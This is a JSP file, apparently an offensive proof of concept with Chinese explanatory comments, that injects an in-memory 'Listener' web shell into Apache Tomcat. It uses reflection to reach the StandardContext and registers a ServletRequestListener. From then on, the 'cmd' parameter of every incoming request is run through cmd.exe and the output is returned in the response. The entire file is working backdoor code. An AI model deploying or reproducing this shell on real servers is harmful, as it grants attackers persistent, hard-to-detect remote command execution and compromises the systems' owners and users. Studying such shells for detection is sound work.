<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.util.Scanner" %>

<%
    class SRL implements ServletRequestListener{
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }
        @Override
        public void requestInitialized(ServletRequestEvent  sre) {
            try {
                InputStream in = java.lang.Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", sre.getServletRequest().getParameter("cmd")}).getInputStream();
                // getField和getDeclaredField都是Class类的方法，反射成员变量时使用，这里返回一個Field對象
                // getDeclaredFiled 仅能获取类本身的属性成员（包括私有、共有、保护）
                // getField 仅能获取类 public属性成员
                Field requestF = sre.getServletRequest().getClass().getDeclaredField("request");
                // 成员变量为private，必须进行此操作。
                // accessible 标志被设置为true，那么反射对象在使用的时候，不会去检查Java语言权限控制（private之类的）；
                // 如果设置为false，反射对象在使用的时候，会检查Java语言权限控制。
                requestF.setAccessible(true);
                Request request = (Request)requestF.get(sre.getServletRequest());
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String o = s.hasNext() ? s.next() : "";
                request.getResponse().getWriter().write(o);
                request.getResponse().getWriter().flush();
                request.getResponse().getWriter().close();
            } catch (IOException | IllegalAccessException | NoSuchFieldException e) {
                e.printStackTrace();
            }
        }
    }
%>

<%
    // 通过反射获取获取context部分
    ServletContext servletContext =  request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    // 添加Listener
    SRL servletRequestListener = new SRL();
    standardContext.addApplicationEventListener(servletRequestListener);
    out.println("listener shell inject success");
%>